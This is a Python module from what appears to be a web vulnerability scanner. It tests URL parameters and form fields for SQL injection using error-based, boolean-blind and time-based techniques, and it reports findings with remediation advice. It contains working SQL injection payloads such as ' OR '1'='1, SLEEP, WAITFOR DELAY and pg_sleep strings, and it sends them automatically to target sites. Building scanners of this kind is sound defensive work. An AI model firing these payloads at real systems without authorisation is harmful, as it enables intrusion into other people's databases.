from __future__ import annotations

import re
import time
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from ..core.baseline import similarity
from ..core.models import Confidence, Finding, Severity

MODULE_NAME = "sqli"
CATEGORY = "SQL Injection"

_ERROR_SIGNS = re.compile(
    r"(SQL syntax.*MySQL|Warning.*\bmysqli?\b|MySqlException|"
    r"valid MySQL result|PostgreSQL.*ERROR|PG::SyntaxError|"
    r"SQLite/JDBCDriver|SQLite3::|System\.Data\.SQLite|"
    r"ORA-\d{5}|Oracle error|"
    r"Microsoft SQL Server|ODBC SQL Server Driver|Unclosed quotation mark|"
    r"SQLSTATE\[|SQLException|syntax error at or near)",
    re.I,
)

ERROR_PAYLOADS = ["'", "\"", "')", "';"]
BOOL_TRUE = "' OR '1'='1"
BOOL_FALSE = "' AND '1'='2"
SLEEP_SECONDS = 5
TIME_PAYLOADS = [
    f"' OR SLEEP({SLEEP_SECONDS})-- -",
    f"'; WAITFOR DELAY '0:0:{SLEEP_SECONDS}'-- -",
    f"' OR pg_sleep({SLEEP_SECONDS})-- -",
]
TIME_CONTROL = "' OR SLEEP(0)-- -"

Target = namedtuple("Target", "method url param data")


def run(ctx, phase=None) -> None:
    ctx.modules_run.append(MODULE_NAME)
    targets = _targets(ctx)
    if phase:
        phase.set_total(max(len(targets), 1))
    with ThreadPoolExecutor(max_workers=max(ctx.threads // 2, 1)) as pool:
        futures = [pool.submit(_test_param, ctx, t) for t in targets]
        for fut in as_completed(futures):
            for f in fut.result():
                ctx.add_finding(f)
            phase and phase.step()
    phase and phase.done()


def _targets(ctx) -> list[Target]:
    out: list[Target] = []
    for url in ctx.discovered_urls:
        for param in parse_qs(urlparse(url).query).keys():
            out.append(Target("get", url, param, {}))
    for form in ctx.forms:
        method = form.get("method", "get")
        if method not in ("get", "post"):
            continue
        action = form.get("action", ctx.target)
        fields = {i["name"]: (i.get("value") or "1")
                  for i in form.get("inputs", []) if i.get("name")}
        for param in fields:
            data = {k: v for k, v in fields.items() if k != param}
            out.append(Target(method, action, param, data))
    return out


def _send(ctx, target: Target, value: str):
    timeout = ctx.timeout + SLEEP_SECONDS + 2
    try:
        if target.method == "post":
            payload = dict(target.data)
            payload[target.param] = value
            r = ctx.session.post(target.url, data=payload, timeout=timeout)
        else:
            parsed = urlparse(target.url)
            q = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in target.data.items():
                q[k] = [v]
            q[target.param] = [value]
            url = urlunparse(parsed._replace(query=urlencode(q, doseq=True)))
            r = ctx.session.get(url, timeout=timeout)
        return r.text, r.elapsed.total_seconds()
    except requests.RequestException:
        return None, None


def _reqline(target: Target, value: str) -> str:
    return f"{target.method.upper()} {target.url}  {target.param}={value}"


def _test_param(ctx, target: Target) -> list[Finding]:
    findings: list[Finding] = []
    clean_body, _ = _send(ctx, target, "lopata1")
    if clean_body is None:
        return findings

    badinput_body, _ = _send(ctx, target, "lopata_$$$_%%%")
    refs = [b for b in (clean_body, badinput_body) if b]

    loc = f"{target.url} [{target.method.upper()} param: {target.param}]"

    for payload in ERROR_PAYLOADS:
        body, _ = _send(ctx, target, "lopata" + payload)
        if body is None:
            continue
        m = _ERROR_SIGNS.search(body)
        if m and not any(_ERROR_SIGNS.search(r) for r in refs):
            findings.append(Finding(
                name="SQL injection (error-based)",
                severity=Severity.HIGH, location=loc,
                description=f"Injecting {payload!r} into '{target.param}' triggers "
                            "a database error absent from the clean and bad-input "
                            "responses, indicating the input reaches a SQL query.",
                remediation="Use parameterised queries / prepared statements; "
                            "never build SQL by string concatenation.",
                module=MODULE_NAME, category=CATEGORY,
                evidence=body[max(0, m.start() - 20):m.start() + 120].replace("\n", " "),
                request=_reqline(target, "lopata" + payload),
                confidence=Confidence.CONFIRMED))
            return findings

    if _boolean_blind(ctx, target, clean_body):
        findings.append(Finding(
            name="SQL injection (boolean-based blind)",
            severity=Severity.HIGH, location=loc,
            description=f"A TRUE condition on '{target.param}' returns a page "
                        "matching the normal response while a FALSE condition "
                        "returns a materially different one — reproducibly — "
                        "indicating boolean-based blind SQLi.",
            remediation="Use parameterised queries; validate and type-check input.",
            module=MODULE_NAME, category=CATEGORY,
            evidence="TRUE ~ clean, FALSE diverges (confirmed on retry)",
            request=_reqline(target, BOOL_TRUE),
            confidence=Confidence.CONFIRMED))
        return findings

    tf = _time_blind(ctx, target)
    if tf:
        findings.append(tf.finding(loc, target))
    return findings


def _boolean_blind(ctx, target: Target, clean_body: str) -> bool:
    def pair():
        t, _ = _send(ctx, target, BOOL_TRUE)
        f, _ = _send(ctx, target, BOOL_FALSE)
        return t, f

    t1, f1 = pair()
    if t1 is None or f1 is None:
        return False
    if not (similarity(clean_body, t1) >= 0.95
            and similarity(clean_body, f1) <= 0.90
            and similarity(t1, f1) <= 0.90):
        return False

    t2, f2 = pair()
    if t2 is None or f2 is None:
        return False
    return (similarity(clean_body, t2) >= 0.95
            and similarity(clean_body, f2) <= 0.90)


class _TimeHit:
    def __init__(self, payload, delay, control):
        self.payload, self.delay, self.control = payload, delay, control

    def finding(self, loc, target: Target):
        return Finding(
            name="SQL injection (time-based blind)",
            severity=Severity.HIGH, location=loc,
            description=f"A time-delay payload on '{target.param}' delayed the "
                        f"response to {self.delay:.1f}s (control "
                        f"{self.control:.1f}s), reproducibly, indicating "
                        "time-based blind SQLi.",
            remediation="Use parameterised queries; do not interpolate input into "
                        "SQL.",
            module=MODULE_NAME, category=CATEGORY,
            evidence=f"delay={self.delay:.1f}s vs control={self.control:.1f}s",
            request=_reqline(target, self.payload),
            confidence=Confidence.CONFIRMED)


def _time_blind(ctx, target: Target) -> "_TimeHit | None":
    _, control_t = _send(ctx, target, TIME_CONTROL)
    if control_t is None:
        return None
    for payload in TIME_PAYLOADS:
        _, t1 = _send(ctx, target, payload)
        if t1 is None or t1 < SLEEP_SECONDS * 0.8:
            continue
        _, t2 = _send(ctx, target, payload)
        _, c2 = _send(ctx, target, TIME_CONTROL)
        if (t2 is not None and t2 >= SLEEP_SECONDS * 0.8
                and c2 is not None and c2 < SLEEP_SECONDS * 0.5):
            return _TimeHit(payload, (t1 + t2) / 2, (control_t + c2) / 2)
    return None
